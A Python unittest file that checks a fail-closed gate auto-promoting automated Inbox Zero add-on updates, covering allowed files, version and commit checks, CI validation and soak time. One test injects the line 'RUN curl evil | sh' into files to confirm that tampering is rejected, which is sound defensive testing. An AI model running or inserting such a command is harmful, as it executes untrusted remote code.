"""Regression checks for the fail-closed Inbox Zero auto-promotion gates."""
import importlib.util
import unittest
from datetime import date
from pathlib import Path
from unittest.mock import patch

SCRIPTS = Path(__file__).resolve().parents[1] / "scripts"


def load(name):
    spec = importlib.util.spec_from_file_location(name, SCRIPTS / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


mod = load("auto_promote_inbox_zero")
updater = load("update_inbox_zero")

REPO = "x/y"
NOW = 1_800_000_000.0
APP = "Inbox Zero"
OLD, MID, NEW = "a" * 40, "b" * 40, "c" * 40
STABLE = {
    f"{APP}/Dockerfile": f"FROM ghcr.io/hypercrisis/inbox-zero-base:{OLD}\n\nARG BUILD_VERSION\n",
    f"{APP}/config.yaml": '---\nname: "Inbox Zero"\ndescription: >-\n'
                          "  Inbox Zero v2.30.0 (fork aaaaaaa) - AI email assistant\n"
                          'version: "v2026.11.09"\n',
    f"{APP}/README.md": "# Inbox Zero\n\n[![Inbox Zero version](https://img.shields.io/badge/"
                        "Inbox%20Zero-v2.30.0%20(aaaaaaa)-6E56CF)]"
                        f"(https://github.com/HyperCriSiS/inbox-zero/commit/{OLD})\n",
    f"{APP}/NOTICE.md": f"- Version currently packaged: v2.30.0 at fork commit {OLD}\n",
    f"{APP}/CHANGELOG.md": "# Changelog\n\n## v2026.11.09\n\n### Added\n\n- First release.\n",
}


def bumped(base="v2.30.1", **overrides):
    """Two consecutive updates exactly as the trusted updater writes them."""
    files = updater.render(STABLE, "v2.30.0", MID, date(2026, 11, 12))
    files = updater.render(files, base, NEW, date(2026, 11, 12))
    files.update(overrides)
    return files


class ContentTests(unittest.TestCase):
    def test_accepts_what_the_updater_writes(self):
        self.assertEqual(mod.check_content(STABLE, bumped()), (OLD, NEW))
        self.assertEqual(mod.check_content(STABLE, bumped("v2.30.0")), (OLD, NEW))
        self.assertEqual(mod.check_content(STABLE, bumped("v2.31.0")), (OLD, NEW))

    def test_rejects_any_other_change(self):
        for name in mod.ALLOWED_FILES - {f"{APP}/CHANGELOG.md"}:
            with self.subTest(file=name), self.assertRaisesRegex(ValueError, "more than"):
                mod.check_content(STABLE, bumped(**{name: bumped()[name] + "RUN curl evil | sh\n"}))

    def test_rejects_changelog_edits(self):
        notes = bumped()[f"{APP}/CHANGELOG.md"]
        for text in (notes.replace("- First release.", "- Rewritten."),
                     notes.replace("(v2.30.1).\n", "(v2.30.1).\n- Also something manual.\n", 1)):
            with self.subTest(text=text[:60]), self.assertRaises(ValueError):
                mod.check_content(STABLE, bumped(**{f"{APP}/CHANGELOG.md": text}))

    def test_rejects_unchanged_commit_downgrade_and_unchanged_app_version(self):
        with self.assertRaisesRegex(ValueError, "commit must change"):
            mod.check_content(STABLE, STABLE)
        with self.assertRaisesRegex(ValueError, "must not decrease"):
            mod.check_content(STABLE, bumped("v2.29.9"))
        same = {name: text.replace("v2026.11.12.1", "v2026.11.09") for name, text in bumped().items()}
        with self.assertRaisesRegex(ValueError, "App version"):
            mod.check_content(STABLE, same)

    def test_major_update_stays_manual(self):
        with self.assertRaisesRegex(mod.Skip, "Major"):
            mod.check_content(STABLE, bumped("v3.0.0"))


class CommitTests(unittest.TestCase):
    def check(self, forward="ahead", on_main="identical", age=49):
        date_text = mod.shared.timestamp
        replies = {
            f"repos/{mod.FORK}/compare/{OLD}...{NEW}": {"status": forward},
            f"repos/{mod.FORK}/compare/{NEW}...main": {"status": on_main},
            f"repos/{mod.FORK}/commits/{NEW}": {"commit": {"committer": {"date": "2026-11-09T00:00:00Z"}}},
        }
        now = date_text("2026-11-09T00:00:00Z") + age * 3600
        with patch.object(mod, "api", side_effect=lambda endpoint: replies[endpoint]):
            mod.check_commit(OLD, NEW, now)

    def test_aged_commit_on_fork_main_passes(self):
        self.check()
        self.check(on_main="ahead")

    def test_rewritten_history_other_branches_and_fresh_commits_stay_manual(self):
        for change, reason in (({"forward": "diverged"}, "history"), ({"forward": "behind"}, "history"),
                               ({"on_main": "behind"}, "main branch"), ({"on_main": "diverged"}, "main branch"),
                               ({"age": 47}, "48 hours")):
            with self.subTest(change=change), self.assertRaisesRegex(mod.Skip, reason):
                self.check(**change)


class GateTests(unittest.TestCase):
    def run_gate(self, state, newest=NOW - 37 * 3600):
        with patch.object(mod, "git") as git, \
             patch.object(mod.shared, "check_history", return_value=newest), \
             patch.object(mod, "show", side_effect=lambda sha, name: (STABLE if sha == "m" else bumped())[name]), \
             patch.object(mod, "check_commit") as check_commit, \
             patch.object(mod, "ci_state", return_value=state):
            git.side_effect = lambda *a: {
                ("rev-parse", "origin/main"): "m", ("rev-parse", "origin/dev-inbox-zero"): "d",
                ("diff", "--name-only", "m", "d"): "\n".join(mod.ALLOWED_FILES),
            }.get(a, "")
            result = mod.gate(REPO, NOW)
            check_commit.assert_called_once_with(OLD, NEW, NOW)
            return result

    def test_validation_is_mandatory(self):
        self.assertEqual(self.run_gate("missing")["action"], "validate")
        self.assertEqual(self.run_gate("running")["action"], "wait")
        with self.assertRaisesRegex(ValueError, "validation failed"):
            self.run_gate("failed")
        self.assertEqual(self.run_gate("success"),
                         {"main_sha": "m", "dev_sha": "d", "commit": NEW, "action": "promote"})

    def test_soak_of_36_hours(self):
        with self.assertRaisesRegex(mod.Skip, "36 hours"):
            self.run_gate("success", newest=NOW - 35 * 3600)

    def test_other_changes_keep_the_release_manual(self):
        with patch.object(mod, "git") as git:
            git.side_effect = lambda *a: {
                ("rev-parse", "origin/main"): "m", ("rev-parse", "origin/dev-inbox-zero"): "d",
                ("diff", "--name-only", "m", "d"): f"{APP}/Dockerfile\n{APP}/run.sh",
            }.get(a, "")
            with self.assertRaisesRegex(mod.Skip, "release manually"):
                mod.gate(REPO, NOW)


class ReleasePrTests(unittest.TestCase):
    pr = {"head": {"ref": "dev-inbox-zero", "sha": "d", "repo": {"full_name": REPO}},
          "draft": False, "labels": [], "number": 7}

    def test_hold_and_stale_heads_are_never_merged(self):
        cases = ({"labels": [{"name": "hold"}]}, {"draft": True},
                 {"head": {"ref": "dev-inbox-zero", "sha": "old", "repo": {"full_name": REPO}}})
        for change in cases:
            with self.subTest(change=change), \
                 patch.object(mod, "api", return_value=[{**self.pr, **change}]), \
                 self.assertRaises(mod.Skip):
                mod.release_pr(REPO, "d")

    def test_existing_release_pr_is_reused(self):
        with patch.object(mod, "api", return_value=[self.pr]):
            self.assertEqual(mod.release_pr(REPO, "d")["number"], 7)


if __name__ == "__main__":
    unittest.main()
